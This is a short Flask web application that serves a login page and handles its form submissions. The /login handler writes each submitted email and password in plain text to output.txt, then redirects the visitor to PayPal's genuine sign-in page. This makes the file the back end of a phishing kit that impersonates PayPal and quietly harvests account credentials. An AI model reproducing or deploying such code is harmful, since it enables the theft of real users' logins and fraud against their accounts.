from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/')
def home():
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')      
        password = request.form.get('password')
        save_values_to_file(email,password)
        return redirect("https://www.paypal.com/signin")
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)

def save_values_to_file(value1, value2, filename="output.txt"):
    with open(filename, "w") as file:
        file.write(f"{value1}\n{value2}")
